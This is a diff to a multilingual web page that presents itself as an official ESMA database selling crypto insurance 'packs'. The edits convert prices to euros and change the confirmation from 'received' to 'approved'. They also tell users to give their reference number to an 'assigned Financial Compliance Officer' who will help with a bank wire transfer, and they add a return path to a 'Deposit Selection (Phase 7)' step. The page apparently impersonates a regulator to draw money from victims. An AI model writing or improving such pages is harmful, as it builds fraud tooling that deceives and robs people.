@@ -412,7 +412,6 @@ input:focus, textarea:focus, select:focus {
 .btn-primary {
   background: var(--eu-blue);
   color: #ffffff;
-  margin-left: auto;
 }
 
 .btn-primary:hover {
@@ -453,7 +452,7 @@ input:focus, textarea:focus, select:focus {
   background: #ffffff;
   padding: 30px;
   border-radius: 4px;
-  max-width: 450px;
+  max-width: 480px;
   width: 90%;
   text-align: center;
   box-shadow: 0 4px 20px rgba(0,0,0,0.15);
@@ -503,18 +502,20 @@ input:focus, textarea:focus, select:focus {
   color: var(--eu-blue);
   background: #e0e8f5;
   border: 1px solid #b3c6e7;
-  padding: 10px;
+  padding: 12px;
   border-radius: 4px;
   margin-bottom: 20px;
   text-align: left;
   display: flex;
   align-items: flex-start;
-  gap: 8px;
+  gap: 10px;
+  line-height: 1.5;
 }
 
 .payment-note i {
-  font-size: 16px;
+  font-size: 18px;
   margin-top: 2px;
+  color: var(--eu-blue);
 }
 
 /* Footer Styles (Fixed in English) */
@@ -780,6 +781,7 @@ input:focus, textarea:focus, select:focus {
         </div>
 
         <div class="nav-actions">
+          <button type="button" class="btn btn-secondary" onclick="returnToClientPhase7()"><i class="fas fa-arrow-left"></i> <span data-i18n="btnReturnPhase7">Return to Deposit Selection (Phase 7)</span></button>
           <button type="button" class="btn btn-primary" onclick="nextPhase(1)"><span data-i18n="btnContinue">Continue</span> &rarr;</button>
         </div>
       </div>
@@ -796,9 +798,9 @@ input:focus, textarea:focus, select:focus {
             <div class="plan-info">
               <div class="plan-top">
                 <span class="plan-title">PACK ESSENTIEL</span>
-                <span class="plan-cost">$2,000</span>
+                <span class="plan-cost">€1,000</span>
               </div>
-              <div class="plan-meta"><strong data-i18n="lblDuration">Duration:</strong> <span data-i18n="dur1Mo">1 month</span> &nbsp;|&nbsp; <strong data-i18n="lblCoverage">Coverage:</strong> <span data-i18n="cov50k">up to $50,000</span></div>
+              <div class="plan-meta"><strong data-i18n="lblDuration">Duration:</strong> <span data-i18n="dur1Mo">1 month</span> &nbsp;|&nbsp; <strong data-i18n="lblCoverage">Coverage:</strong> <span data-i18n="cov50k">up to €50,000</span></div>
               <div class="plan-risks"><strong data-i18n="lblCoveredRisks">Covered Risks:</strong> <span data-i18n="riskPack1">Wallet hacking, Theft on centralized exchange</span></div>
             </div>
           </label>
@@ -808,9 +810,9 @@ input:focus, textarea:focus, select:focus {
             <div class="plan-info">
               <div class="plan-top">
                 <span class="plan-title">PACK PREMIUM</span>
-                <span class="plan-cost">$5,000</span>
+                <span class="plan-cost">€1,750</span>
               </div>
-              <div class="plan-meta"><strong data-i18n="lblDuration">Duration:</strong> <span data-i18n="dur6Mo">6 months</span> &nbsp;|&nbsp; <strong data-i18n="lblCoverage">Coverage:</strong> <span data-i18n="cov100k">up to $100,000</span></div>
+              <div class="plan-meta"><strong data-i18n="lblDuration">Duration:</strong> <span data-i18n="dur6Mo">6 months</span> &nbsp;|&nbsp; <strong data-i18n="lblCoverage">Coverage:</strong> <span data-i18n="cov100k">up to €100,000</span></div>
               <div class="plan-risks"><strong data-i18n="lblCoveredRisks">Covered Risks:</strong> <span data-i18n="riskPack2">Hacking & theft, Exchange failure, Temporary loss of access</span></div>
             </div>
           </label>
@@ -820,9 +822,9 @@ input:focus, textarea:focus, select:focus {
             <div class="plan-info">
               <div class="plan-top">
                 <span class="plan-title">PACK ULTIME</span>
-                <span class="plan-cost">$10,000</span>
+                <span class="plan-cost">€2,500</span>
               </div>
-              <div class="plan-meta"><strong data-i18n="lblDuration">Duration:</strong> <span data-i18n="dur12Mo">12 months</span> &nbsp;|&nbsp; <strong data-i18n="lblCoverage">Coverage:</strong> <span data-i18n="cov500k">up to $500,000</span></div>
+              <div class="plan-meta"><strong data-i18n="lblDuration">Duration:</strong> <span data-i18n="dur12Mo">12 months</span> &nbsp;|&nbsp; <strong data-i18n="lblCoverage">Coverage:</strong> <span data-i18n="cov500k">up to €500,000</span></div>
               <div class="plan-risks"><strong data-i18n="lblCoveredRisks">Covered Risks:</strong> <span data-i18n="riskPack3">Hacking, theft, exchange collapse, Lost seed phrase, Wrong address transfer</span></div>
             </div>
           </label>
@@ -885,7 +887,7 @@ input:focus, textarea:focus, select:focus {
 <div class="modal-overlay" id="resultModal">
   <div class="modal-card">
     <h3 style="margin: 0 0 10px 0; color: var(--eu-blue);" data-i18n="hdrModalSubmitted">Application Submitted</h3>
-    <p style="font-size: 14px; color: var(--text-muted); margin: 0;" data-i18n="msgModalSubmitted">Your application has been received. Your unique insurance reference ID is:</p>
+    <p style="font-size: 14px; color: var(--text-muted); margin: 0;" data-i18n="msgModalSubmitted">Your insurance application has been approved. Your unique insurance reference ID is:</p>
     
     <div class="policy-badge">
       <div class="policy-number" id="insuranceNumberDisplay">-------</div>
@@ -896,10 +898,10 @@ input:focus, textarea:focus, select:focus {
 
     <div class="payment-note">
       <i class="fas fa-info-circle"></i>
-      <span data-i18n="msgPaymentNote">Please include this insurance policy number as the transaction reference when making your policy payment.</span>
+      <span data-i18n="msgPaymentNote">Please provide this insurance reference number directly to your assigned Financial Compliance Officer, who will assist you in completing the bank wire transfer.</span>
     </div>
 
-    <button class="btn btn-primary" style="width: 100%;" onclick="closeModal()" data-i18n="btnClose">Close</button>
+    <button class="btn btn-primary" style="width: 100%;" onclick="closeModalAndRedirect()" data-i18n="btnReturnPortal">Acknowledge & Return to Portal</button>
   </div>
 </div>
 
@@ -1199,6 +1201,7 @@ const i18n = {
     optStudentRetired: "Student or retired",
     btnContinue: "Continue",
     btnBack: "Back",
+    btnReturnPhase7: "Return to Deposit Selection (Phase 7)",
     btnSendRequest: "Send Request",
     hdrSelectPlan: "Select Your Crypto Cover",
     lblDuration: "Duration:",
@@ -1206,9 +1209,9 @@ const i18n = {
     dur6Mo: "6 months",
     dur12Mo: "12 months",
     lblCoverage: "Coverage:",
-    cov50k: "up to $50,000",
-    cov100k: "up to $100,000",
-    cov500k: "up to $500,000",
+    cov50k: "up to €50,000",
+    cov100k: "up to €100,000",
+    cov500k: "up to €500,000",
     lblCoveredRisks: "Covered Risks:",
     riskPack1: "Wallet hacking, Theft on centralized exchange",
     riskPack2: "Hacking & theft, Exchange failure, Temporary loss of access",
@@ -1221,12 +1224,12 @@ const i18n = {
     lblDate: "Date:",
     declarationText: "We applicant declare that the submitted information is true, accurate, complete and not misleading and we have disclosed any other information, which might reasonably be considered relevant for the purpose of the application.",
     hdrModalSubmitted: "Application Submitted",
-    msgModalSubmitted: "Your application has been received. Your unique insurance reference ID is:",
+    msgModalSubmitted: "Your insurance application has been approved. Your unique insurance reference ID is:",
     lblInsuranceNum: "Insurance Number",
     btnCopy: "Copy",
     btnCopied: "Copied!",
-    msgPaymentNote: "Please include this insurance policy number as the transaction reference when making your policy payment.",
-    btnClose: "Close"
+    msgPaymentNote: "Please provide this insurance reference number directly to your assigned Financial Compliance Officer, who will assist you in completing the bank wire transfer.",
+    btnReturnPortal: "Acknowledge & Return to Portal"
   },
   DA: {
     topBanner: "Officiel database for Den Europæiske Værdipapir- og Markedstilsynsmyndighed",
@@ -1254,6 +1257,7 @@ const i18n = {
     optStudentRetired: "Studerende eller pensionist",
     btnContinue: "Fortsæt",
     btnBack: "Tilbage",
+    btnReturnPhase7: "Vend tilbage til valget af indbetalingsmetode (fase 7)",
     btnSendRequest: "Send anmodning",
     hdrSelectPlan: "Vælg din kryptodækning",
     lblDuration: "Varighed:",
@@ -1261,9 +1265,9 @@ const i18n = {
     dur6Mo: "6 måneder",
     dur12Mo: "12 måneder",
     lblCoverage: "Dækning:",
-    cov50k: "op til $50.000",
-    cov100k: "op til $100.000",
-    cov500k: "op til $500.000",
+    cov50k: "op til €50.000",
+    cov100k: "op til €100.000",
+    cov500k: "op til €500.000",
     lblCoveredRisks: "Dækkede risici:",
     riskPack1: "Wallet-hacking, tyveri på centraliseret børs",
     riskPack2: "Hacking og tyveri, børssvigt, midlertidigt tab af adgang",
@@ -1276,12 +1280,12 @@ const i18n = {
     lblDate: "Dato:",
     declarationText: "Vi erklærer som ansøger, at de indsendte oplysninger er sande, nøjagtige, fuldstændige og ikke vildledende, og at vi har oplyst alle andre oplysninger, der med rimelighed kan anses for relevante for ansøgningen.",
     hdrModalSubmitted: "Ansøgning indsendt",
-    msgModalSubmitted: "Din ansøgning er modtaget. Dit unikke forsikringsreferencenummer er:",
+    msgModalSubmitted: "Din forsikringsansøgning er godkendt. Dit unikke forsikringsreferencenummer er:",
     lblInsuranceNum: "Forsikringsnummer",
     btnCopy: "Kopier",
     btnCopied: "Kopieret!",
-    msgPaymentNote: "Inkluder venligst dette forsikringspolicenummer som transaktionsreference, når du foretager din policebetaling.",
-    btnClose: "Luk"
+    msgPaymentNote: "Angiv venligst dette forsikringsreferencenummer direkte til din tildelte Financial Compliance Officer, som vil hjælpe dig med at gennemføre bankoverførslen.",
+    btnReturnPortal: "Anerkend og vend tilbage til portalen"
   },
   DE: {
     topBanner: "Offizielle Datenbank der Europäischen Wertpapier- und Marktaufsichtsbehörde",
@@ -1309,6 +1313,7 @@ const i18n = {
     optStudentRetired: "Student oder Rentner",
     btnContinue: "Weiter",
     btnBack: "Zurück",
+    btnReturnPhase7: "Zurück zur Einzahlungsauswahl (Phase 7)",
     btnSendRequest: "Anfrage senden",
     hdrSelectPlan: "Wählen Sie Ihren Krypto-Schutz",
     lblDuration: "Laufzeit:",
@@ -1316,9 +1321,9 @@ const i18n = {
     dur6Mo: "6 Monate",
     dur12Mo: "12 Monate",
     lblCoverage: "Deckung:",
-    cov50k: "bis zu $50.000",
-    cov100k: "bis zu $100.000",
-    cov500k: "bis zu $500.000",
+    cov50k: "bis zu €50.000",
+    cov100k: "bis zu €100.000",
+    cov500k: "bis zu €500.000",
     lblCoveredRisks: "Abgedeckte Risiken:",
     riskPack1: "Wallet-Hacking, Diebstahl auf zentralisierter Börse",
     riskPack2: "Hacking & Diebstahl, Börsenausfall, vorübergehender Zugriffsverlust",
@@ -1331,12 +1336,12 @@ const i18n = {
     lblDate: "Datum:",
     declarationText: "Wir als Antragsteller erklären, dass die übermittelten Informationen wahr, genau, vollständig und nicht irreführend sind und dass wir alle anderen Informationen offengelegt haben, die für den Zweck des Antrags als relevant angesehen werden können.",
     hdrModalSubmitted: "Antrag eingereicht",
-    msgModalSubmitted: "Ihr Antrag ist eingegangen. Ihre eindeutige Versicherungs-Referenz-ID lautet:",
+    msgModalSubmitted: "Ihr Versicherungsantrag wurde genehmigt. Ihre eindeutige Versicherungs-Referenz-ID lautet:",
     lblInsuranceNum: "Versicherungsnummer",
     btnCopy: "Kopieren",
     btnCopied: "Kopiert!",
-    msgPaymentNote: "Bitte geben Sie diese Versicherungsscheinnummer als Transaktionsreferenz an, wenn Sie Ihre Policenzahlung leisten.",
-    btnClose: "Schließen"
+    msgPaymentNote: "Bitte teilen Sie diese Versicherungsreferenznummer direkt Ihrem zuständigen Financial Compliance Officer mit, der Ihnen bei der Durchführung der Banküberweisung behilflich sein wird.",
+    btnReturnPortal: "Bestätigen & zum Portal zurückkehren"
   },
   DU: {
     topBanner: "Officiële database van de Europese Autoriteit voor effecten en markten",
@@ -1364,6 +1369,7 @@ const i18n = {
     optStudentRetired: "Student of gepensioneerd",
     btnContinue: "Doorgaan",
     btnBack: "Terug",
+    btnReturnPhase7: "Terug naar stortingsselectie (Fase 7)",
     btnSendRequest: "Aanvraag versturen",
     hdrSelectPlan: "Selecteer uw krypto-dekking",
     lblDuration: "Loooptijd:",
@@ -1371,9 +1377,9 @@ const i18n = {
     dur6Mo: "6 maanden",
     dur12Mo: "12 maanden",
     lblCoverage: "Dekking:",
-    cov50k: "tot $50.000",
-    cov100k: "tot $100.000",
-    cov500k: "tot $500.000",
+    cov50k: "tot €50.000",
+    cov100k: "tot €100.000",
+    cov500k: "tot €500.000",
     lblCoveredRisks: "Gedekte risico's:",
     riskPack1: "Wallet-hacking, diefstal op gecentraliseerde beurs",
     riskPack2: "Hacking & diefstal, beursfout, tijdelijk verlies van toegang",
@@ -1386,12 +1392,12 @@ const i18n = {
     lblDate: "Datum:",
     declarationText: "Wij als aanvrager verklaren dat de verstrekte informatie juist, nauwkeurig, volledig en niet misleidend is en dat we alle andere informatie hebben bekendgemaakt die redelijkerwijs relevant kan worden geacht voor de aanvraag.",
     hdrModalSubmitted: "Aanvraag ingediend",
-    msgModalSubmitted: "Uw aanvraag is ontvangen. Uw unieke verzekeringsreferentie-ID is:",
+    msgModalSubmitted: "Uw verzekeringsaanvraag is goedgekeurd. Uw unieke verzekeringsreferentie-ID is:",
     lblInsuranceNum: "Verzekeringsnummer",
     btnCopy: "Kopiëren",
     btnCopied: "Gekopieerd!",
-    msgPaymentNote: "Vermeld dit polisnummer als transactiereferentie wanneer u de polisbetaling voldoet.",
-    btnClose: "Sluiten"
+    msgPaymentNote: "Geef dit verzekeringsreferentienummer rechtstreeks door aan uw toegewezen Financial Compliance Officer, die u zal helpen bij het voltooien van de bankoverschrijving.",
+    btnReturnPortal: "Bevestigen & terugkeren naar Portal"
   },
   ES: {
     topBanner: "Base de datos oficial de la Autoridad Europea de Valores y Mercados",
@@ -1419,6 +1425,7 @@ const i18n = {
     optStudentRetired: "Estudiante o jubilado",
     btnContinue: "Continuar",
     btnBack: "Atrás",
+    btnReturnPhase7: "Volver a la selección de depósito (Fase 7)",
     btnSendRequest: "Enviar solicitud",
     hdrSelectPlan: "Seleccione su cobertura cripto",
     lblDuration: "Duración:",
@@ -1426,9 +1433,9 @@ const i18n = {
     dur6Mo: "6 meses",
     dur12Mo: "12 meses",
     lblCoverage: "Cobertura:",
-    cov50k: "hasta $50,000",
-    cov100k: "hasta $100,000",
-    cov500k: "hasta $500,000",
+    cov50k: "hasta €50,000",
+    cov100k: "hasta €100,000",
+    cov500k: "hasta €500,000",
     lblCoveredRisks: "Riesgos cubiertos:",
     riskPack1: "Hacking de billetera, robo en exchange centralizado",
     riskPack2: "Hacking y robo, fallo de exchange, pérdida temporal de acceso",
@@ -1441,12 +1448,12 @@ const i18n = {
     lblDate: "Fecha:",
     declarationText: "Nosotros como solicitantes declaramos que la información presentada es verdadera, precisa, completa y no engañosa y hemos revelado cualquier otra información que pueda considerarse razonablemente relevante para la solicitud.",
     hdrModalSubmitted: "Solicitud enviada",
-    msgModalSubmitted: "Se ha recibido su solicitud. Su ID de referencia de seguro único es:",
+    msgModalSubmitted: "Su solicitud de seguro ha sido aprobada. Su ID de referencia de seguro único es:",
     lblInsuranceNum: "Número de seguro",
     btnCopy: "Copiar",
     btnCopied: "¡Copiado!",
-    msgPaymentNote: "Incluya este número de póliza de seguro como referencia de transacción al realizar el pago de su póliza.",
-    btnClose: "Cerrar"
+    msgPaymentNote: "Proporcione este número de referencia de seguro directamente a su Oficial de Cumplimiento Financiero asignado, quien le ayudará a completar la transferencia bancaria.",
+    btnReturnPortal: "Aceptar y volver al portal"
   },
   FI: {
     topBanner: "Euroopan arvopaperimarkkinaviranomaisen virallinen tietokanta",
@@ -1474,6 +1481,7 @@ const i18n = {
     optStudentRetired: "Opiskelija tai eläkeläinen",
     btnContinue: "Jatka",
     btnBack: "Takaisin",
+    btnReturnPhase7: "Palaa talletustavan valintaan (Vaihe 7)",
     btnSendRequest: "Lähetä pyyntö",
     hdrSelectPlan: "Valitse kryptosuojauksesi",
     lblDuration: "Kesto:",
@@ -1481,9 +1489,9 @@ const i18n = {
     dur6Mo: "6 kuukautta",
     dur12Mo: "12 kuukautta",
     lblCoverage: "Kattavuus:",
-    cov50k: "enintään $50 000",
-    cov100k: "enintään $100 000",
-    cov500k: "enintään $500 000",
+    cov50k: "enintään €50 000",
+    cov100k: "enintään €100 000",
+    cov500k: "enintään €500 000",
     lblCoveredRisks: "Katetut riskit:",
     riskPack1: "Lompakon hakkerointi, varkaus keskitetyssä pörssissä",
     riskPack2: "Hakkerointi ja varkaus, pörssin toimintahäiriö, tilapäinen pääsyn menetys",
@@ -1496,12 +1504,12 @@ const i18n = {
     lblDate: "Päivämäärä:",
     declarationText: "Me hakijana vakuutamme, että annetut tiedot ovat totuudenmukaisia, tarkkoja, täydellisiä eivätkä harhaanjohtavia, ja olemme ilmoittaneet kaikki muut tiedot, joita voidaan kohtuudella pitää hakemuksen kannalta olennaisina.",
     hdrModalSubmitted: "Hakemus lähetetty",
-    msgModalSubmitted: "Hakemuksesi on vastaanotettu. Ainutkertainen vakuutusviitteesi on:",
+    msgModalSubmitted: "Vakuutushakemuksesi on hyväksytty. Ainutkertainen vakuutusviitteesi on:",
     lblInsuranceNum: "Vakuutusnumero",
     btnCopy: "Kopioi",
     btnCopied: "Kopioitu!",
-    msgPaymentNote: "Sisällytä tämä vakuutuksen numero maksun viitteeksi suorittaessasi vakuutusmaksua.",
-    btnClose: "Sulje"
+    msgPaymentNote: "Ilmoita tämä vakuutuksen viitenumero suoraan nimetyille taloudelliselle vaatimustenmukaisuusvastaavallesi, joka auttaa sinua pankkisiirron suorittamisessa.",
+    btnReturnPortal: "Vahvista ja palaa portaaliin"
   },
   FR: {
     topBanner: "Base de données officielle de l'Autorité européenne des marchés financiers",
@@ -1529,6 +1537,7 @@ const i18n = {
     optStudentRetired: "Étudiant ou retraité",
     btnContinue: "Continuer",
     btnBack: "Retour",
+    btnReturnPhase7: "Retour à la sélection du dépôt (Phase 7)",
     btnSendRequest: "Envoyer la demande",
     hdrSelectPlan: "Sélectionnez votre couverture crypto",
     lblDuration: "Durée :",
@@ -1536,9 +1545,9 @@ const i18n = {
     dur6Mo: "6 mois",
     dur12Mo: "12 mois",
     lblCoverage: "Couverture :",
-    cov50k: "jusqu'à 50 000 $",
-    cov100k: "jusqu'à 100 000 $",
-    cov500k: "jusqu'à 500 000 $",
+    cov50k: "jusqu'à 50 000 €",
+    cov100k: "jusqu'à 100 000 €",
+    cov500k: "jusqu'à 500 000 €",
     lblCoveredRisks: "Risques couverts :",
     riskPack1: "Piratage de portefeuille, vol sur plateforme centralisée",
     riskPack2: "Piratage et vol, défaillance de la plateforme, perte temporaire d'accès",
@@ -1551,12 +1560,12 @@ const i18n = {
     lblDate: "Date :",
     declarationText: "Nous demandeur déclarons que les informations soumises sont vraies, exactes, complètes et non trompeuses et que nous avons divulgué toute autre information qui pourrait raisonnablement être considérée comme pertinente aux fins de la demande.",
     hdrModalSubmitted: "Demande envoyée",
-    msgModalSubmitted: "Votre demande a été reçue. Votre identifiant de référence d'assurance unique est :",
+    msgModalSubmitted: "Votre demande d'assurance a été approuvée. Votre identifiant de référence d'assurance unique est :",
     lblInsuranceNum: "Numéro d'assurance",
     btnCopy: "Copier",
     btnCopied: "Copié !",
-    msgPaymentNote: "Veuillez inclure ce numéro de police d'assurance comme référence de transaction lors du paiement de votre police.",
-    btnClose: "Fermer"
+    msgPaymentNote: "Veuillez fournir ce numéro de référence d'assurance directement à votre responsable de la conformité financière dédié, qui vous aidera à effectuer le virement bancaire.",
+    btnReturnPortal: "Confirmer et retourner au portail"
   },
   IT: {
     topBanner: "Database ufficiale dell'Autorità europea degli strumenti finanziari e dei mercati",
@@ -1584,6 +1593,7 @@ const i18n = {
     optStudentRetired: "Studente o pensionato",
     btnContinue: "Continua",
     btnBack: "Indietro",
+    btnReturnPhase7: "Ritorna alla selezione del deposito (Fase 7)",
     btnSendRequest: "Invia richiesta",
     hdrSelectPlan: "Seleziona la tua copertura crypto",
     lblDuration: "Durata:",
@@ -1591,9 +1601,9 @@ const i18n = {
     dur6Mo: "6 mesi",
     dur12Mo: "12 mesi",
     lblCoverage: "Copertura:",
-    cov50k: "fino a $50.000",
-    cov100k: "fino a $100.000",
-    cov500k: "fino a $500.000",
+    cov50k: "fino a €50.000",
+    cov100k: "fino a €100.000",
+    cov500k: "fino a €500.000",
     lblCoveredRisks: "Rischi coperti:",
     riskPack1: "Hacking del portafoglio, furto su exchange centralizzato",
     riskPack2: "Hacking e furto, fallimento exchange, perdita temporanea di accesso",
@@ -1606,12 +1616,12 @@ const i18n = {
     lblDate: "Data:",
     declarationText: "Noi richiedenti dichiariamo che le informazioni inviate sono vere, accurate, complete e non fuorvianti e abbiamo divulgato qualsiasi altra informazione che potrebbe essere ragionevolmente considerata rilevante ai fini della domanda.",
     hdrModalSubmitted: "Domanda inviata",
-    msgModalSubmitted: "La tua domanda è stata ricevuta. Il tuo ID di riferimento assicurativo unico è:",
+    msgModalSubmitted: "La tua richiesta di assicurazione è stata approvata. Il tuo ID di riferimento assicurativo unico è:",
     lblInsuranceNum: "Numero di assicurazione",
     btnCopy: "Copia",
     btnCopied: "Copiato!",
-    msgPaymentNote: "Si prega di includere questo numero di polizza assicurativa come riferimento della transazione durante il pagamento della polizza.",
-    btnClose: "Chiudi"
+    msgPaymentNote: "Fornisci questo numero di riferimento assicurativo direttamente al tuo Financial Compliance Officer dedicato, che ti assisterà nel completare il bonifico bancario.",
+    btnReturnPortal: "Conferma e torna al portale"
   },
   NO: {
     topBanner: "Offisiell database for Den europeiske verdipapir- og markedstilsynsmyndighet",
@@ -1639,6 +1649,7 @@ const i18n = {
     optStudentRetired: "Student eller pensjonist",
     btnContinue: "Fortsett",
     btnBack: "Tilbake",
+    btnReturnPhase7: "Gå tilbake til valg av innskuddsmetode (Fase 7)",
     btnSendRequest: "Send forespørsel",
     hdrSelectPlan: "Velg din kryptodekning",
     lblDuration: "Varighet:",
@@ -1646,9 +1657,9 @@ const i18n = {
     dur6Mo: "6 måneder",
     dur12Mo: "12 måneder",
     lblCoverage: "Dekning:",
-    cov50k: "opptil $50 000",
-    cov100k: "opptil $100 000",
-    cov500k: "opptil $500 000",
+    cov50k: "opptil €50 000",
+    cov100k: "opptil €100 000",
+    cov500k: "opptil €500 000",
     lblCoveredRisks: "Dekkede risikoer:",
     riskPack1: "Wallet-hacking, tyveri på sentralisert børs",
     riskPack2: "Hacking og tyveri, børssvikt, midlertidig tap av tilgang",
@@ -1661,12 +1672,12 @@ const i18n = {
     lblDate: "Dato:",
     declarationText: "Vi som søker erklærer at den innsendte informasjonen er sann, nøyaktig, fullstendig og ikke misvisende, og vi har oppgitt all annen informasjon som med rimelighet kan anses som relevant for søknaden.",
     hdrModalSubmitted: "Søknad sendt",
-    msgModalSubmitted: "Søknaden din er mottatt. Din unike forsikringsreferanse-ID er:",
+    msgModalSubmitted: "Forsikringssøknaden din er godkjent. Din unike forsikringsreferanse-ID er:",
     lblInsuranceNum: "Forsikringsnummer",
     btnCopy: "Kopier",
     btnCopied: "Kopiert!",
-    msgPaymentNote: "Vennligst oppgi dette forsikringspolisenummeret som transaksjonsreferanse når du betaler polisen.",
-    btnClose: "Lukk"
+    msgPaymentNote: "Vennligst oppgi dette forsikringsreferansenummeret direkte til din dedikerte Financial Compliance Officer, som vil hjelpe deg med å fullføre bankoverføringen.",
+    btnReturnPortal: "Bekreft og gå tilbake til portalen"
   },
   SV: {
     topBanner: "Officiell databas för Europeiska värdepappers- och marknadsmyndigheten",
@@ -1694,6 +1705,7 @@ const i18n = {
     optStudentRetired: "Student eller pensionär",
     btnContinue: "Fortsätt",
     btnBack: "Tillbaka",
+    btnReturnPhase7: "Återvänd till val av insättning (Fas 7)",
     btnSendRequest: "Skicka begäran",
     hdrSelectPlan: "Välj ditt kryptoskydd",
     lblDuration: "Varaktighet:",
@@ -1701,9 +1713,9 @@ const i18n = {
     dur6Mo: "6 månader",
     dur12Mo: "12 månader",
     lblCoverage: "Täckning:",
-    cov50k: "upp till $50 000",
-    cov100k: "upp till $100 000",
-    cov500k: "upp till $500 000",
+    cov50k: "upp till €50 000",
+    cov100k: "upp till €100 000",
+    cov500k: "upp till €500 000",
     lblCoveredRisks: "Täckta risker:",
     riskPack1: "Plånbokshackning, stöld på centraliserad börs",
     riskPack2: "Hackning & stöld, börsfel, tillfällig förlust av åtkomst",
@@ -1716,12 +1728,12 @@ const i18n = {
     lblDate: "Datum:",
     declarationText: "Vi sökande förklarar att den insända informationen är sann, korrekt, fullständig och inte vilseledande och att vi har lämnat all annan information som rimligen kan anses vara relevant för ansökan.",
     hdrModalSubmitted: "Ansökan insänd",
-    msgModalSubmitted: "Din ansökan har mottagits. Ditt unika försäkringsreferens-ID är:",
+    msgModalSubmitted: "Din försäkringsansökan har godkänts. Ditt unika försäkringsreferens-ID är:",
     lblInsuranceNum: "Försäkringsnummer",
     btnCopy: "Kopiera",
     btnCopied: "Kopierad!",
-    msgPaymentNote: "Vänligen ange detta försäkringsbrevnummer som transaktionsreferens när du gör din försäkringsbetalning.",
-    btnClose: "Stäng"
+    msgPaymentNote: "Vänligen ange detta försäkringsreferensnummer direkt till din utsedda Financial Compliance Officer, som hjälper dig att slutföra banköverföringen.",
+    btnReturnPortal: "Bekräfta och återvänd till portalen"
   }
 };
 
@@ -1878,6 +1890,24 @@ function prevPhase(fromPhase) {
   }
 }
 
+/* Safe Return to Client's Specific Database on Phase 7 */
+function returnToClientPhase7() {
+  const urlParams = new URLSearchParams(window.location.search);
+  let clientEmail = urlParams.get('email') || document.getElementById('email').value.trim().toLowerCase();
+  
+  if (!clientEmail) {
+    try {
+      clientEmail = localStorage.getItem('esma_active_client_email');
+    } catch(e) {}
+  }
+
+  if (clientEmail) {
+    window.location.href = `index.html?email=${encodeURIComponent(clientEmail)}&phase=7`;
+  } else {
+    window.location.href = 'index.html';
+  }
+}
+
 /* Insurance Code Generator & Clipboard Script */
 document.getElementById('insuranceForm').addEventListener('submit', function(e) {
   e.preventDefault();
@@ -1903,13 +1933,9 @@ function copyPolicyNumber() {
   }, 2000);
 }
 
-function closeModal() {
+function closeModalAndRedirect() {
   document.getElementById('resultModal').style.display = 'none';
-  document.getElementById('insuranceForm').reset();
-  document.getElementById('nationality').value = '';
-  document.getElementById('natSelectedText').innerText = i18n[currentLang]?.phSelectCountry || "Select Country...";
-  currentPhase = 1;
-  updateStepUI(1);
+  returnToClientPhase7();
 }
 </script>
 </body>
